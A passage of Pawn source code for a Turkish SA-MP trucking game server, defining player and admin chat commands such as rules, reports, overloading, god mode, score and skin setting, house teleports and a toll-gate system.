	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Loop through all vehicles owned by this player
		Player_LoadHouses(playerid);
		for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
		{
			// Get the HouseID that exists on this index
			HouseID = APlayerData[playerid][Houses][HouseSlot];

			// check if this house-slot is used
			if (HouseID != 0)
			{
				// Loop through all vehicles assigned to this house
				for (new CarSlot; CarSlot < 11; CarSlot++)
				{
					// Get the vehicle-id of the vehicle in this carslot
					vid = AHouseData[HouseID][VehicleIDs][CarSlot];

					// Check if this carslot is used
					if (vid != 0)
					{
						// Check if this vehicle is clamped
						if (AVehicleData[vid][Clamped] == true)
						    ClampedVehicles++; // Count the clamped vehicles
					}
				}
			}
		}

		// Check if there were any clamped vehicles
		if (ClampedVehicles > 0)
		{
			// Calculate the price to unclamp all the player's vehicles
			UnclampPrice = ClampedVehicles * UnclampPricePerVehicle;

			// Construct the message to inform the player how many vehicles have been clamped and how much it costs to un-clamp them
			format(Msg, 128, "You have %i clamped vehicles, it will cost you $%i to unclamp them", ClampedVehicles, UnclampPrice);
		    // Show a dialog that informs the player how many vehicles have been clamped and how much it costs to un-clamp them
			ShowPlayerDialog(playerid, DialogUnclampVehicles, DIALOG_STYLE_MSGBOX, TXT_AreYouSure, Msg, "Unclamp", TXT_DialogButtonCancel);
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}You don't have any clamped vehicles");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command displays the rules of the server
CMD:kurallar(playerid, params[])
{
	// Setup local variables
	new Msg[2000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/kurallar", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Construct the rules
		format(Msg, 2000, "%s1.  Yolda kalýn ve kendi seridinizde gidin\n", Msg);
		format(Msg, 2000, "%s2.  Oyunculara çarpmayýn onlarý yoldan çýkartmayýn\n", Msg);
		format(Msg, 2000, "%s3.  Kullanýlabilir diller Türkçe/English ( Only Languages )\n", Msg);
		format(Msg, 2000, "%s4.  Herhangi bir hile ban sebebidir.\n", Msg);
		format(Msg, 2000, "%s5.  Chat spam ve flood yapmayýnýz\n", Msg);
		format(Msg, 2000, "%s6.  Araç çalmak yasaktýr\n", Msg);
		format(Msg, 2000, "%s7.  Diger Meslek Araclarini Calmak YASAK\n", Msg);
		format(Msg, 2000, "%s8.  Küfür ve hakaret içerikli mesajlar göndermeyiniz\n", Msg);
 		format(Msg, 2000, "%s9.  Siyasi içerikli mesajlar göndermeyiniz\n", Msg);
  		format(Msg, 2000, "%s10.  Baþka bir sunucunun reklamýný yapmayýnýz\n", Msg);
  		format(Msg, 2000, "%s11. Sunucu içinde tartýþma çýkartmayýnýz\n", Msg);
	    // Show a dialog that shows the rules
		ShowPlayerDialog(playerid, DialogRules, DIALOG_STYLE_MSGBOX, "Server Kurallari :", Msg, "Kabul", TXT_DialogButtonCancel);
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Report a player for breaking the rules
CMD:sikayet(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Name[24], Reason[255], Msg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/sikayet", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (sscanf(params, "us[128]", OtherPlayer, Reason)) SendSyntaxMessage(playerid, "/sikayet <id> <mesaj>");
		else
		{
		    // Check if that other player is logged in
		    if (APlayerData[OtherPlayer][LoggedIn] == true)
		    {
				// Send the report to all admins and add the report to the report-list so admins can review it
				SendReportToAdmins(OtherPlayer, Reason);
			    new rYazi[255];
			 	for (new admid; admid < MAX_PLAYERS; admid++)
				{
				    if (APlayerData[admid][PlayerLevel] >= 1 || Root[admid] == 1 )
				    {
						format(rYazi,255,"{FF0000}RAPOR EDEN: {00FF00}%s", GetName(playerid));
						SendClientMessage(admid,-1,rYazi);
				    }
				}
				// Get the name of the offender
				GetPlayerName(OtherPlayer, Name, sizeof(Name));
				// Let the player know he reported the other player
				format(Msg, 128, "{00FF00}Sikayet Ettiginiz Oyuncu : {FFFF00}%s", Name);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				new Yazi[1024];
				format(Yazi, 1000, "%s Isimli oyuncu sikayet edildi : Sebep: %s.", Name,  Reason);
				SqlLogYaz(playerid, 4, Yazi);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Oyuncu Oyunda Degil");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:rapor(playerid, params[])
{
  return cmd_sikayet(playerid, params);
}

CMD:report(playerid, params[])
{
  return cmd_sikayet(playerid, params);
}

// Lets the admins see the list of reports
CMD:sikayetler(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/sikayetler", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			// Add the first report to the list (if it exists)
			if (AReports[0][ReportUsed] == true)
			    format(ReportList, 5000, "%s: %s\n", AReports[0][ReportName], AReports[0][ReportReason]);

			// Construct the report-dialog
			for (new i = 1; i < 50; i++)
			{
				// Check if the ReportID has been used already
				if (AReports[i][ReportUsed] == true)
				{
				    format(ReportList, 5000, "%s%s: %s\n", ReportList, AReports[i][ReportName], AReports[i][ReportReason]);
				}
			}

			// Show all the reports
			ShowPlayerDialog(playerid, DialogReports, DIALOG_STYLE_LIST, "Sikayet Listesi:", ReportList, "OK", "Cancel");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Enables the trucker to overload himself
CMD:asiriyuk(playerid, params[])
{
	// Setup local variables
	new vModel, bool:ValidOverLoad = false, Float:x, Float:y, Float:z, Name[24], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/asiriyuk", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the playeris a trucker
		if (APlayerData[playerid][PlayerClass] == ClassTruckDriver)
		{
			// Check if he has already started a job
			if (APlayerData[playerid][JobStarted] == true)
			{
				// Check if the player has already loaded his load
				if (APlayerData[playerid][JobStep] == 2)
				{
					// Check if the player isn't overloaded already
					if (APlayerData[playerid][Overloaded] == false)
					{
						// Get the coordinates of the loading point
						x = ALocations[APlayerData[playerid][JobLoc1]][LocX];
						y = ALocations[APlayerData[playerid][JobLoc1]][LocY];
						z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];

					    // Check if the player is still near the loading point
					    if (IsPlayerInRangeOfPoint(playerid, 25.0, x, y, z))
					    {
							// Get the vehicle-model of the player's vehicle
							vModel = GetVehicleModel(APlayerData[playerid][VehicleID]);

							// Check if the trucker is driving a trucking vehicle that can be overloaded
							switch (vModel)
							{
								case VehicleFlatbed, VehicleDFT30: ValidOverLoad = true; // Flatbed and DFT-30 can be overloaded
								case VehicleLineRunner, VehicleTanker, VehicleRoadTrain:
								{
									switch (GetVehicleModel(APlayerData[playerid][TrailerID]))
									{
										case VehicleTrailerCargo, VehicleTrailerCargo2, VehicleTrailerOre: ValidOverLoad = true; // Cargo and ore trailer can be overloaded
									}
								}
							}

							// Check if the vehicle is valid for overloading
							if (ValidOverLoad == true)
							{
								// Set overloaded for this player to True
           						APlayerData[playerid][Overloaded] = true;
							    // Add 2 to the player's wanted level
							    APlayerData[playerid][PlayerWanted] += 2;
							    // Let the player know he has been overloaded now
							    SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Aþýrý Yük Aldýnýz , polis ve mafyalarin dikkatini çekeceksiniz.");
								// Inform the police this trucker is overloaded
								GetPlayerName(playerid, Name, sizeof(Name));
        						format(Msg, 128, "{00FF00}MERKEZ : {FFFF00}%s{00FF00} adlý oyuncunun aþýrý yük aldýgý tespit edildi...", Name);
								Police_SendMessage(Msg);
								APlayerData[playerid][PlayerWanted] += 2;
							}
							else
							    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu Araca Aþýrý Yükleme Yapamassýnýz");
						}
						else
						    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Yuk Alma Yerine Yakýn Degilsin.");
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Zaten Aþýrý Yükleme Yaptýn");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Ýlk Önce Yük Al");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bir Gorev Baslatmadiniz.");
		}
		else
			return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:overload(playerid, params[])
{
  return cmd_asiriyuk(playerid, params);
}

CMD:god(playerid, params[])
{
    SendAdminText(playerid, "/god", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			    if (God[playerid] == 0)
				{
					SendClientMessage(playerid, -1, "* GOD AKTIF.");
					SetPlayerHealth(playerid, 100000);
			  		SetPlayerArmour(playerid, 100000);
			    	God[playerid] = 1;
				}
				else
				{
				    SendClientMessage(playerid, -1, "* GOD PASIF.");
					SetPlayerHealth(playerid, 100);
			  		SetPlayerArmour(playerid, 0);
				    God[playerid] = 0;
				}
		}
	}
	return 1;
}

// This command resets a player's money, score and stats to 0 (if chosen)
CMD:oyuncusifirla(playerid, params[])
{
	// Setup local variables
	new Name[24], AdminName[24], Reason[128], Msg[128], OtherPlayer, ClearMoney, ClearScore, ClearStats;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/oyuncusifirla", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 4 || Root[playerid] == 1)
		{
			if (sscanf(params, "uiiis[128]", OtherPlayer, ClearMoney, ClearScore, ClearStats, Reason)) SendSyntaxMessage(playerid, "/oyuncusifirla <id> <para (0/1)> <skor (0/1)> <bilgiler (0/1)> <sebep>");
			else
			{
			    // Check if the other player is logged in
				if (APlayerData[OtherPlayer][LoggedIn] == true)
				{
					// Check if there is at least one parameter given to be cleared, otherwise exit the command
					if ((ClearMoney + ClearScore + ClearStats) == 0)
						return 1;

					// Get the names of both players
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					GetPlayerName(OtherPlayer, Name, sizeof(Name));

					// Reset the other player's money to 0
					if (ClearMoney == 1)
					{
						APlayerData[OtherPlayer][PlayerMoney] = 0;
						//format(Msg, 128, "{FF0000}Your money has been reset by {FFFF00}%s", AdminName);
						//SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
						format(Msg, 128, "{00FF00}You've reset the money of player {FFFF00}%s", Name);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					}

					// Reset the other player's score to 0
					if (ClearScore == 1)
					{
						APlayerData[OtherPlayer][PlayerScore] = 0;
						//format(Msg, 128, "{FF0000}Your score has been reset by {FFFF00}%s", AdminName);
						//SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
						format(Msg, 128, "{00FF00}You've reset the score of player {FFFF00}%s", Name);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					}

					// Reset the other player's stats to 0
					if (ClearStats == 1)
					{
						APlayerData[OtherPlayer][StatsTruckerJobs] = 0;
						APlayerData[OtherPlayer][StatsConvoyJobs] = 0;
						APlayerData[OtherPlayer][StatsBusDriverJobs] = 0;
						APlayerData[OtherPlayer][StatsDolmusDriverJobs] = 0;
						APlayerData[OtherPlayer][StatsPilotJobs] = 0;
						APlayerData[OtherPlayer][StatsMafiaJobs] = 0;
						APlayerData[OtherPlayer][StatsMafiaStolen] = 0;
						APlayerData[OtherPlayer][StatsPoliceFined] = 0;
						APlayerData[OtherPlayer][StatsPoliceJailed] = 0;
						APlayerData[OtherPlayer][StatsRoadworkerJobs] = 0;
						APlayerData[OtherPlayer][StatsMetersDriven] = 0.0;
						//format(Msg, 128, "{FF0000}Your stats have been reset by {FFFF00}%s", AdminName);
						//SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
						format(Msg, 128, "{00FF00}You've reset the stats of player {FFFF00}%s", Name);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					}

					// Let the other player know the reason too
					//format(Msg, 128, "{FF0000}Reason: {FFFF00}%s", Reason);
					//SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);

					// Save the other player's account
					Oyuncu_Kaydet(OtherPlayer);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't connected");
			}
		}
		else
			return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}




// This command searches every house and business that the player owns and restores the data for it in the player's account
CMD:fixplayer(playerid, params[])
{
	// Setup local variables
	new Name[24], AdminName[24], Msg[128], OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/fixplayer", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/fixplayer <ID>");
			else
			{
			    // Check if the other player is logged in
				if (APlayerData[OtherPlayer][LoggedIn] == true)
				{
					// Get the names of both players
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					GetPlayerName(OtherPlayer, Name, sizeof(Name));

					// Clear the houses and businesses that the player owns right now
					for (new i; i < MAX_HOUSESPERPLAYER; i++)
					    APlayerData[OtherPlayer][Houses][i] = 0;

					for (new i; i < MAX_BUSINESSPERPLAYER; i++)
					    APlayerData[OtherPlayer][Business][i] = 0;

					// Now search through all houses and re-add them to the player
					for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
						if (AHouseData[HouseID][Owned] == true) // Check if the house is owned by somebody
							if (strcmp(AHouseData[HouseID][Owner], Name, false) == 0) // Check if the player is the owner of the house
							{
								for (new i; i < MAX_HOUSESPERPLAYER; i++) // Loop through all houses the player owns
								    if (APlayerData[OtherPlayer][Houses][i] == 0) // Check if the houseslot is free
								    {
										APlayerData[OtherPlayer][Houses][i] = HouseID; // Store the HouseID
										break; // Stop searching for more free slots
								    }
					}

                    Player_LoadHouses(playerid);

					// Now search through all businesses and re-add them to the player
				/*	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
						if (ABusinessData[BusID][Owned] == true) // Check if the business is owner by someone
							if (strcmp(ABusinessData[BusID][Owner], Name, false) == 0) // Check if the player is the owner of the business
							{
								for (new i; i < MAX_BUSINESSPERPLAYER; i++) // Loop through all businesses the player owns
								    if (APlayerData[OtherPlayer][Business][i] == 0) // Check if the businessslot is free
								    {
										APlayerData[OtherPlayer][Business][i] = BusID; // Store the BusID
										break; // Stop searching for more free slots
								    }
							}

                    Player_LoadBusiness(playerid);
                    */
					// Let the other player know his property has been restored
					format(Msg, 128, "{00FF00}Ýþyerleriniz ve evleriniz restore edildi. Restore eden ADMIN: {FFFF00}%s", AdminName);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);

					// Save the other player's account
					Oyuncu_Kaydet(OtherPlayer);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't connected");
			}
		}
		else
			return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command sets a skin for the player
CMD:setskin(playerid, params[])
{
	// Setup local variables
	new Msg[128], Skin ,OtherPlayer,Name[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/setskin", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 4 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, Skin))
			SendSyntaxMessage(playerid, "/setskin <ID> <skin ID>");
			else
			{
				// Check if the player entered a valid skin-id
				if ((Skin >= 0) && (Skin <= 600000))
				{
			    	GetPlayerName(OtherPlayer, Name, sizeof(Name));
				    // Set the skin for the player
				    SetPlayerSkin(OtherPlayer, Skin);
					// Let the other player know the reason too
					format(Msg, 128, "{00FF00} %s adlý oyuncunun skin tipini (%i) degistirdiniz.",Name,Skin);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
				else
					SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Invalid skin-id, you can only use skins 0-311");
			}
		}
		else
			return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Sets the score of another player
CMD:setscore(playerid, params[])
{
	// Setup local variables
	new Msg[128], Name[24], OtherName[24], OtherPlayer, pScore;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/setscore", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1 || Root2[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, pScore)) SendSyntaxMessage(playerid, "/setscore <ID> <Skor>");
			else
			{
				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer))
				{
					// Get the player-names
					GetPlayerName(playerid, Name, sizeof(Name));
					GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));

					// Set the other player's score
					APlayerData[OtherPlayer][PlayerScore] = pScore;
					// Let the other player know that his score has been changed
					format(Msg, 128, "{00FF00}Your score has been set to {FFFF00}%i{00FF00} by {FFFF00}%s", pScore, Name);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					// Let the player know he has set the score of the other player
					format(Msg, 128, "{00FF00}You've set the score of {FFFF00}%s{00FF00} to {FFFF00}%i", OtherName, pScore);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Save the other player's account
					Oyuncu_Kaydet(OtherPlayer);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Sets the score of another player
CMD:skorver(playerid, params[])
{
	// Setup local variables
	new Msg[128], Name[24], OtherName[24], OtherPlayer, pScore;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/skorver", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, pScore)) SendSyntaxMessage(playerid, "/skorver <ID> <Miktar>");
			else
			{
				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer))
				{
					// Get the player-names
					GetPlayerName(playerid, Name, sizeof(Name));
					GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));

					// Set the other player's score
					RewardPlayer(OtherPlayer, 0, pScore);
					// Let the other player know that his score has been changed
					format(Msg, 128, "{00FF00}Size {FFFF00}%i{00FF00} skor verildi. Gönderen ADMIN {FFFF00}%s", pScore, Name);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					// Let the player know he has set the score of the other player
					format(Msg, 128, "{FFFF00}%s{00FF00}'a {FFFF00}%i {00FF00}skor verdiniz.", OtherName, pScore);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Save the other player's account
					Oyuncu_Kaydet(OtherPlayer);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command lists all help-items for which the player can get information about it
CMD:yardim(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/yardim", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Create the dialog that lists all help-items
        HelpList_Create(playerid);
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command allows you to change your password for logging in
CMD:sifredegistir(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/sifredegistir", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Show the dialog where the player must enter his old password
		ShowPlayerDialog(playerid, DialogOldPassword, DIALOG_STYLE_INPUT, "Sifre Degistirme Bolumu", "Eski Sifrenizi Girini:", "OK", "Cancel");
	}
	return 1;
}

// This command opens a menu where you can choose neons lights for your vehicle
CMD:vipneon(playerid, params[]) //vip1
{
	// Setup local variables
	new OptionsList[200], DialogTitle[200];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/neon", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is the driver of a vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
		    if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
		    {
				format(DialogTitle, sizeof(DialogTitle), "Neon ýþýðý seç:");
				format(OptionsList, sizeof(OptionsList), "%sPolis ýþýklarý\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sKýrmýzý ýþýk\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sMavi ýþýk\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sYeþil ýþýk\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sSarý ýþýk\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sPembe ýþýk\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sBeyaz ýþýk\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sNeon sil.\n", OptionsList);
				// Show the neon menu
				ShowPlayerDialog(playerid, DialogNeon, DIALOG_STYLE_LIST, DialogTitle, OptionsList, "Select", "Cancel");
			}
			else
			{
			SendClientMessage(playerid,-1,"{FF0000} VIP DEGILSINIZ ");
			}
			}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "You're not the driver of a vehicle");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command shows the current bonus mission
CMD:bonus(playerid, params[])
{
    SendAdminText(playerid, "/bonus", params);
    if(KomutZaman[playerid] == 0)
    {
		// Check if the player has logged in
		if (APlayerData[playerid][LoggedIn] == true)
		{
			// Check if the player is a trucker
			if (APlayerData[playerid][PlayerClass] == ClassTruckDriver)
			{
					//ShowRandomBonusMission();
					ShowRBM(playerid);
					KomutZaman[playerid] = 1;
			}
		}
	}
	else
	{
 	SendClientMessage(playerid,-1," {FF0000} Tekrar Yazmak Icýn 5 Saniye Beklemeniz Gerekiyor ");
	}

	// Let the server know that this was a valid command
	return 1;
}

// ************************************************************************************************************************************************************
// PPC_Toll
// ************************************************************************************************************************************************************
// This file holds all functions for the toll-system

/*forward KomutKontrol(playerid);
public KomutKontrol(playerid)
{
KomutZaman[playerid] = 0;
}*/

forward Toll();
public Toll()
{
	// Loop through all players
    for(new playerid; playerid < MAX_PLAYERS; playerid++)
	{
		// If the player isn't connected, skip to the next player
        if(APlayerData[playerid][LoggedIn] == false) continue;

		// Check if the player is the driver of a vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Loop through all toll-gates
			for (new TollGate; TollGate < MAX_TOLLGATES; TollGate++)
			{
				// Check if this toll-gate exists
				if (ATollGates[TollGate][GateID] != 0)
				{
				    // Check if the player is in range of the tollgate
			        if(IsPlayerInRangeOfPoint(playerid, 7.5, ATollGates[TollGate][TollX], ATollGates[TollGate][TollY], ATollGates[TollGate][TollZ]))
			        {
						// Check if the toll-gate is closed
			            if(ATollGates[TollGate][GateStatus] == 0)
						{
		    				if(APlayerData[playerid][PlayerMoney] < ATollGates[TollGate][TollPrice])
							{
								SendClientMessage(playerid, -1, "{FF0000}Bu giþeden geçmek için yeterli paranýz yok!");
								continue;
							}
						    // Open the gate
			                MoveDynamicObject(ATollGates[TollGate][GateID], ATollGates[TollGate][TollX], ATollGates[TollGate][TollY], ATollGates[TollGate][TollZ]+1.5, 0.5, ATollGates[TollGate][TollRX], ATollGates[TollGate][TollRY]+45.0, ATollGates[TollGate][TollRZ]);
							// Set status to OPEN
			                ATollGates[TollGate][GateStatus] = 1;
							if (ATollGates[TollGate][TollPrice] != 0)
							{
								// Let the player pay the toll
								RewardPlayer(playerid, -ATollGates[TollGate][TollPrice], 0);
								if(!strcmp(ATollGates[TollGate][GateOwner], "-", true))
								{
								}else{
									ATollGates[TollGate][GateCash] += ATollGates[TollGate][TollPrice];
								}
								ATollGates[TollGate][GateGecenSayisi]++;
								SaveTollGate(TollGate);
								PlayerPlaySound(playerid, 1058, 0.0, 0.0, 10.0);
								new string[50];
								format(string, sizeof(string), TXT_PlayerPaysToll, ATollGates[TollGate][TollPrice]);
								GameTextForPlayer(playerid, string, 3000, 4);
							}
			                // Start a timer that closes the gate after 5 seconds
			                SetTimerEx("CloseGate", 3000, false, "i", TollGate);
						}
			        }
				}
			}
		}
    }
}

forward CloseGate(TollGate);
public CloseGate(TollGate)
{
    // Close the gate
	MoveDynamicObject(ATollGates[TollGate][GateID], ATollGates[TollGate][TollX], ATollGates[TollGate][TollY], ATollGates[TollGate][TollZ]+0.82, 0.5, ATollGates[TollGate][TollRX], ATollGates[TollGate][TollRY]-90.0, ATollGates[TollGate][TollRZ]);
	// Set status to CLOSED
	ATollGates[TollGate][GateStatus] = 0;
}

/*
Eski Toll
// This file holds all functions for the toll-system
forward Toll();
public Toll()
{
	// Loop through all players
    for(new playerid; playerid < MAX_PLAYERS; playerid++)
	{
		// If the player isn't connected, skip to the next player
        if(APlayerData[playerid][LoggedIn] == false) continue;

		// Check if the player is the driver of a vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Loop through all toll-gates
			for (new TollGate; TollGate < MAX_TOLLGATES; TollGate++)
			{
				// Check if this toll-gate exists
				if (ATollGates[TollGate][GateID] != 0)
				{
				    // Check if the player is in range of the tollgate
			        if(IsPlayerInRangeOfPoint(playerid, 7.5, ATollGates[TollGate][CloseX], ATollGates[TollGate][CloseY], ATollGates[TollGate][CloseZ]))
			        {
						// Check if the toll-gate is closed
			            if(ATollGates[TollGate][GateStatus] == 0)
						{
						    // Open the gate
			                MoveObject(ATollGates[TollGate][GateID], ATollGates[TollGate][OpenX], ATollGates[TollGate][OpenY], ATollGates[TollGate][OpenZ], 3.0);
							// Set status to OPEN
			                ATollGates[TollGate][GateStatus] = 1;
			                // Let the player pay the toll
			                RewardPlayer(playerid, -ATollGates[TollGate][TollPrice], 0);
			                new string[50];
			                format(string, sizeof(string), TXT_PlayerPaysToll, ATollGates[TollGate][TollPrice]);
			                GameTextForPlayer(playerid, string, 3000, 4);
			                // Start a timer that closes the gate after 5 seconds
			                SetTimerEx("CloseGate", 5000, false, "i", TollGate);
						}
			        }
				}
			}
		}
    }
}

forward CloseGate(TollGate);
public CloseGate(TollGate)
{
    // Close the gate
	MoveObject(ATollGates[TollGate][GateID], ATollGates[TollGate][CloseX], ATollGates[TollGate][CloseY], ATollGates[TollGate][CloseZ], 3.0);
	// Set status to CLOSED
	ATollGates[TollGate][GateStatus] = 0;
}
*/
// ************************************************************************************************************************************************************
// PPC_Extras
// ************************************************************************************************************************************************************

// Setup a global array to be used for loading player-file data
//new FileContent[100][100];



// This command lets the player teleport to a house
CMD:aevgit(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/aevgit", params);

	// Exit the command if the player hasn't logged in using his password
	if (APlayerData[playerid][LoggedIn] == false) return 0;
	// Exit the command if the player has an admin-level lower than 5
	if (APlayerData[playerid][PlayerLevel] < 5  && Root[playerid] == 0) return 0;
	// Exit the command if the player is inside a vehicle
	if (GetPlayerVehicleSeat(playerid) != -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /porthouse when you're inside a vehicle");

	// Setup local variables
	new Msg[128], HouseID;

	// Get the HouseID from the parameters
	if (sscanf(params, "i", HouseID)) return SendSyntaxMessage(playerid, "/porthouse <Ev ID>");

	// Check if the player entered a valid HouseID
	if ((HouseID < 0) || (HouseID >= MAX_HOUSES)) return SendClientMessage(playerid, 0xFF0000AA, "You need to enter a valid HouseID");

	// Check if the house exists (it must have a valid pickup)
	if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
	{
		// Port the player to the given location
		SetPlayerPos(playerid, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]);

		// Let the player know he ported to the given house
		format(Msg, 128, "{00FF00}You ported to house with ID: {FFFF00}%i", HouseID);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);
	}
	else
		SendClientMessage(playerid, 0xFF0000AA, "That house doesn't exist");

	// Let the server know that this was a valid command
	return 1;
}

// This command lets the player teleport to a business
CMD:aisgit(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/aisgit", params);

	// Exit the command if the player hasn't logged in using his password
	if (APlayerData[playerid][LoggedIn] == false) return 0;
	// Exit the command if the player has an admin-level lower than 5
	if (APlayerData[playerid][PlayerLevel] < 5 && Root[playerid] == 0) return 0;
	// Exit the command if the player is inside a vehicle
	if (GetPlayerVehicleSeat(playerid) != -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /portbus when you're inside a vehicle");

	// Setup local variables
	new Msg[128], BusID;

	// Get the BusID from the parameters
	if (sscanf(params, "i", BusID)) return SendSyntaxMessage(playerid, "/portbus <Ýþyeri ID>");

	// Check if the player entered a valid BusID
